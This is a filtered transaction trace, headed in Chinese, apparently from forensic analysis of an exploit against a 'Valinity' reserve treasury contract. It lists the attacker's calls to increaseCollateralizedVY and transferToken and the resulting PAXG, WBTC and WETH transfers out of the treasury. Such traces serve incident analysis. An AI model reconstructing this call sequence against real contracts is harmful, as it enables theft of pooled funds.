# TRACE 调用时间线

> **过滤规则**: 只显示攻击者对外部合约的调用 + 受害者合约相关调用

  [0] CALL 0xed5a32...118391(Valinity DeFi Exploiter) -> 0x88f51f...7a82b0 :: swap(address,address,uint256,uint256)
        status=OK, gasUsed=3166007, value=0
        args: _fromToken:address=0x7b4d07929c256367a47ec0d8ecebf6bf8fc2bf74, _toToken:address=0xf5b31637ba156bd876bc7e2d71bc9237654a485a, _amountIn:uint256=177,535,000,000, _minAmountOut:uint256=1,888,000,000,000,000,000

  [941] CALL 0x7b4d07...c2bf74(0x7b4d_ERC1967Proxy) -> 0x86e811...33250a(ValinityReserveTreasury) :: increaseCollateralizedVY(address,uint256)
        status=OK, gasUsed=9424, value=0
        args: asset:address=0x45804880de22913dafe09f4980848ece6ecbaf78, vyAmount:uint256=38,400,273,000,000,000,000,000,000

    [942] SLOT READ  contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x8d5a8feca881594a70a1da0b52124c3aeaaba80725cda46042924ffca4e2c3f5
          value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

    [943] SLOT READ  contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x3bad00ddbd0b1fb6e65372d9d6769ebd9baa2e67d9cf8518c07f68fbb9dec394
          value=0x00000000000000000000000000000000000000000002aee4407cf0665f62053b (3243753911750620411462971)

    [944] SLOT WRITE contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x3bad00ddbd0b1fb6e65372d9d6769ebd9baa2e67d9cf8518c07f68fbb9dec394
          prev=0x00000000000000000000000000000000000000000002aee4407cf0665f62053b (3243753911750620411462971)
          curr=0x00000000000000000000000000000000000000000022727738f1b66da106053b (41644026911750620411462971)

  [961] CALL 0x7b4d07...c2bf74(0x7b4d_ERC1967Proxy) -> 0x86e811...33250a(ValinityReserveTreasury) :: transferToken(address,address,uint256)
        status=OK, gasUsed=23019, value=0
        args: asset:address=0x45804880de22913dafe09f4980848ece6ecbaf78, to:address=0x8c86bc7d11a5817357a8d897a0cd636078b6d2d9, amount:uint256=24,359,881,667,550,512

    [962] SLOT READ  contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x8d5a8feca881594a70a1da0b52124c3aeaaba80725cda46042924ffca4e2c3f5
          value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

    [963] CALL 0x86e811...33250a(ValinityReserveTreasury) -> 0x458048...cbaf78(0x4580_PAXG) :: transfer(address,uint256)
          status=OK, gasUsed=19752, value=0
          args: recipient:address=0x8c86bc7d11a5817357a8d897a0cd636078b6d2d9, amount:uint256=24,359,881,667,550,512
          returns: bool=True

  [981] CALL 0x7b4d07...c2bf74(0x7b4d_ERC1967Proxy) -> 0x86e811...33250a(ValinityReserveTreasury) :: transferToken(address,address,uint256)
        status=OK, gasUsed=11419, value=0
        args: asset:address=0x45804880de22913dafe09f4980848ece6ecbaf78, to:address=0x88f51f2c2c0b5b1ee60c6fadde7e5cc2aa7a82b0, amount:uint256=2,411,628,285,087,500,719

    [982] SLOT READ  contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x8d5a8feca881594a70a1da0b52124c3aeaaba80725cda46042924ffca4e2c3f5
          value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

    [983] CALL 0x86e811...33250a(ValinityReserveTreasury) -> 0x458048...cbaf78(0x4580_PAXG) :: transfer(address,uint256)
          status=OK, gasUsed=8152, value=0
          args: recipient:address=0x88f51f2c2c0b5b1ee60c6fadde7e5cc2aa7a82b0, amount:uint256=2,411,628,285,087,500,719
          returns: bool=True

  [1058] CALL 0x7b4d07...c2bf74(0x7b4d_ERC1967Proxy) -> 0x86e811...33250a(ValinityReserveTreasury) :: increaseCollateralizedVY(address,uint256)
        status=OK, gasUsed=7424, value=0
        args: asset:address=0x2260fac5e5542a773aa44fbcfedf7c193bc2c599, vyAmount:uint256=19,800,000,000,000,000,000,000

    [1059] SLOT READ  contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x8d5a8feca881594a70a1da0b52124c3aeaaba80725cda46042924ffca4e2c3f5
          value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

    [1060] SLOT READ  contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x158cab4f3f3d7fb3fa7c40cadad4cf2a7d7d1541704c6190fb3782e9411c2817
          value=0x00000000000000000000000000000000000000000002aef154ec0c5c3699b7e7 (3243995191849924500764647)

    [1061] SLOT WRITE contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x158cab4f3f3d7fb3fa7c40cadad4cf2a7d7d1541704c6190fb3782e9411c2817
          prev=0x00000000000000000000000000000000000000000002aef154ec0c5c3699b7e7 (3243995191849924500764647)
          curr=0x00000000000000000000000000000000000000000002b322b11ee376d4f9b7e7 (3263795191849924500764647)

  [1078] CALL 0x7b4d07...c2bf74(0x7b4d_ERC1967Proxy) -> 0x86e811...33250a(ValinityReserveTreasury) :: transferToken(address,address,uint256)
        status=OK, gasUsed=14970, value=0
        args: asset:address=0x2260fac5e5542a773aa44fbcfedf7c193bc2c599, to:address=0x8c86bc7d11a5817357a8d897a0cd636078b6d2d9, amount:uint256=82,050

    [1079] SLOT READ  contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x8d5a8feca881594a70a1da0b52124c3aeaaba80725cda46042924ffca4e2c3f5
          value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

    [1080] CALL 0x86e811...33250a(ValinityReserveTreasury) -> 0x2260fa...c2c599(WBTC) :: transfer(address,uint256)
          status=OK, gasUsed=11703, value=0
          args: _to:address=0x8c86bc7d11a5817357a8d897a0cd636078b6d2d9, _value:uint256=82,050
          returns: bool=True

  [1089] CALL 0x7b4d07...c2bf74(0x7b4d_ERC1967Proxy) -> 0x86e811...33250a(ValinityReserveTreasury) :: transferToken(address,address,uint256)
        status=OK, gasUsed=29270, value=0
        args: asset:address=0x2260fac5e5542a773aa44fbcfedf7c193bc2c599, to:address=0x88f51f2c2c0b5b1ee60c6fadde7e5cc2aa7a82b0, amount:uint256=8,122,975

    [1090] SLOT READ  contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x8d5a8feca881594a70a1da0b52124c3aeaaba80725cda46042924ffca4e2c3f5
          value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

    [1091] CALL 0x86e811...33250a(ValinityReserveTreasury) -> 0x2260fa...c2c599(WBTC) :: transfer(address,uint256)
          status=OK, gasUsed=26003, value=0
          args: _to:address=0x88f51f2c2c0b5b1ee60c6fadde7e5cc2aa7a82b0, _value:uint256=8,122,975
          returns: bool=True

  [1157] CALL 0x7b4d07...c2bf74(0x7b4d_ERC1967Proxy) -> 0x86e811...33250a(ValinityReserveTreasury) :: increaseCollateralizedVY(address,uint256)
        status=OK, gasUsed=7424, value=0
        args: asset:address=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2, vyAmount:uint256=143,380,960,699,260,165,940,944

    [1158] SLOT READ  contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x8d5a8feca881594a70a1da0b52124c3aeaaba80725cda46042924ffca4e2c3f5
          value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

    [1159] SLOT READ  contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x49e349d4f386739afdf8e55db7675b584d46c3b2a603eef62554e21dc437b5db
          value=0x000000000000000000000000000000000000000000029643e3bb077c43e20b1c (3127458953230541222185756)

    [1160] SLOT WRITE contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x49e349d4f386739afdf8e55db7675b584d46c3b2a603eef62554e21dc437b5db
          prev=0x000000000000000000000000000000000000000000029643e3bb077c43e20b1c (3127458953230541222185756)
          curr=0x00000000000000000000000000000000000000000002b4a09647629331ddf1ec (3270839913929801388126700)

  [1177] CALL 0x7b4d07...c2bf74(0x7b4d_ERC1967Proxy) -> 0x86e811...33250a(ValinityReserveTreasury) :: transferToken(address,address,uint256)
        status=OK, gasUsed=11329, value=0
        args: asset:address=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2, to:address=0x8c86bc7d11a5817357a8d897a0cd636078b6d2d9, amount:uint256=170,173,935,315,528,453

    [1178] SLOT READ  contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x8d5a8feca881594a70a1da0b52124c3aeaaba80725cda46042924ffca4e2c3f5
          value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

    [1179] CALL 0x86e811...33250a(ValinityReserveTreasury) -> 0xc02aaa...756cc2(WETH) :: transfer(address,uint256)
          status=OK, gasUsed=8062, value=0
          args: dst:address=0x8c86bc7d11a5817357a8d897a0cd636078b6d2d9, wad:uint256=170,173,935,315,528,453
          returns: bool=True

  [1187] CALL 0x7b4d07...c2bf74(0x7b4d_ERC1967Proxy) -> 0x86e811...33250a(ValinityReserveTreasury) :: transferToken(address,address,uint256)
        status=OK, gasUsed=28429, value=0
        args: asset:address=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2, to:address=0x7b4d07929c256367a47ec0d8ecebf6bf8fc2bf74, amount:uint256=16,847,219,596,237,316,941

    [1188] SLOT READ  contract=0x86e811...33250a(ValinityReserveTreasury)
          key=0x8d5a8feca881594a70a1da0b52124c3aeaaba80725cda46042924ffca4e2c3f5
          value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

    [1189] CALL 0x86e811...33250a(ValinityReserveTreasury) -> 0xc02aaa...756cc2(WETH) :: transfer(address,uint256)
          status=OK, gasUsed=25162, value=0
          args: dst:address=0x7b4d07929c256367a47ec0d8ecebf6bf8fc2bf74, wad:uint256=16,847,219,596,237,316,941
          returns: bool=True
